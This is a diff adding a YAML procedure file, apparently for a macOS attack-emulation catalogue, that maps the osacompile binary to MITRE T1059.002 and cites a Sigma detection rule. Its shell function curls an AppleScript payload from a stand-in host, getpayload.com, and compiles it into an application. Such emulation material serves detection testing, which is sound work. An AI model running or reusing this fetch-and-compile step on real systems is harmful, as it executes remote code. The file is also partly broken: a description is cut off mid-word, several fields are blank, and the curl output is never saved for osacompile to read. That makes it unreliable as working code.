@@ -1,0 +1,52 @@
+procedure_name: osacompile
+tactic: Execution
+ttp_id: T1059.002
+guid: 5bcb80a3-0f38-44d5-bb3b-7b6ab474dda5
+intent: Compile AppleScripts or OSA language scripts. Sourced from LOOBins; confirm
+  MITRE mapping for each enabled option.
+author: Brendan Chamberlain (@infosecB)
+created: '2023-05-14'
+updated: '2026-05-03'
+version: 1.0.4
+platform:
+- darwin
+detection:
+- ioc: 'Sigma: In-Memory Download And Compile Of Payloads (experimental/pending)'
+  analysis: https://github.com/SigmaHQ/sigma/pull/4127/commits/f4b0264a83e5f47473029e26dc0879fb196a7d07
+resources:
+- link: https://www.loobins.io/
+  description: "LOOBins \u2014 Living Off The Orchard macOS binaries"
+- link: https://attack.mitre.org/techniques/T1059/002/
+  description: "MITRE ATT&CK \u2014 T1059.002"
+- link: ''
+  description: ''
+- link: https://redcanary.com/blog/mac-application-bundles/
+  description: 'A bundle of nerves: Tweaking macOS security controls to thwart application
+    bundle manipulation'
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --download-and-compile-a-payload
+    description: The following command downloads an applescript payload from getpayload.com
+      and compiles it into an a
+    execute_function:
+    - execute_download_compile_payload
+  global_variable:
+  - name: CMD_OSACOMPILE
+    type: string
+    default_value: /usr/bin/osacompile
+  functions:
+  - name: execute_download_compile_payload
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_download_compile_payload() {\n    local result\n    result=$(curl\
+      \ https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script\
+      \ -o payload.app 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return\
+      \ 0\n}"
